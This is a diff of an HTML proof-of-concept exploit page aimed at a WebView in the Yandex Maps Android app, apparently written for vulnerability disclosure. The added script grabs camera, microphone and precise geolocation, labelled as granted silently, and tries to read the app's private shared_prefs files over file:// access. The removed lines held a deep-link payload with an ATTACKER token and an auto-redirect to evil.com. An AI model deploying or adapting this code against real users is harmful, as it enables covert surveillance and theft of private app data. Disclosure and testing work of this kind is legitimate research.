@@ -1,12 +1,57 @@
+<!DOCTYPE html>
 <html>
+<head><title>Silent Permission PoC</title></head>
 <body>
-<h1>Yandex Bank Deep Link PoC</h1>
-<a href="yandexbank://ru.yandex.yandexmaps/payment/callback?status=success&token=ATTACKER">
-  Click to trigger
-</a>
+<h1 style="color:red;font-size:48px">SILENT ACCESS PoC</h1>
+<video id="cam" autoplay muted style="width:320px;height:240px"></video>
+<div id="result" style="font-size:24px"></div>
 <script>
-  // Auto-trigger
-  window.location = "yandexbank://ru.yandex.yandexmaps/payment/callback?redirect=https://evil.com";
+var result = '';
+
+// 1. Silent camera + microphone access
+navigator.mediaDevices.getUserMedia({video: true, audio: true})
+  .then(function(stream) {
+    document.getElementById('cam').srcObject = stream;
+    result += 'CAMERA: GRANTED SILENTLY\\n';
+    result += 'MICROPHONE: GRANTED SILENTLY\\n';
+    result += 'Video tracks: ' + stream.getVideoTracks().length + '\\n';
+    result += 'Audio tracks: ' + stream.getAudioTracks().length + '\\n';
+    document.getElementById('result').innerText = result;
+  })
+  .catch(function(err) {
+    result += 'MEDIA ERROR: ' + err.name + '\\n';
+    document.getElementById('result').innerText = result;
+  });
+
+// 2. Silent geolocation access
+navigator.geolocation.getCurrentPosition(
+  function(pos) {
+    result += 'GEOLOCATION: GRANTED SILENTLY\\n';
+    result += 'Lat: ' + pos.coords.latitude + '\\n';
+    result += 'Lon: ' + pos.coords.longitude + '\\n';
+    result += 'Accuracy: ' + pos.coords.accuracy + 'm\\n';
+    document.getElementById('result').innerText = result;
+    alert('SILENT ACCESS: Camera + Mic + Geo\\n' + result);
+  },
+  function(err) {
+    result += 'GEO ERROR: ' + err.message + '\\n';
+    document.getElementById('result').innerText = result;
+  },
+  {enableHighAccuracy: true}
+);
+
+// 3. Test file:// access (Tanker WebView has AllowFileAccess=true)
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'file:///data/data/ru.yandex.yandexmaps/shared_prefs/', true);
+xhr.onload = function() {
+  result += 'FILE ACCESS: ' + xhr.responseText.substring(0, 200) + '\\n';
+  document.getElementById('result').innerText = result;
+};
+xhr.onerror = function() {
+  result += 'FILE ACCESS: blocked\\n';
+  document.getElementById('result').innerText = result;
+};
+xhr.send();
 </script>
 </body>
 </html>
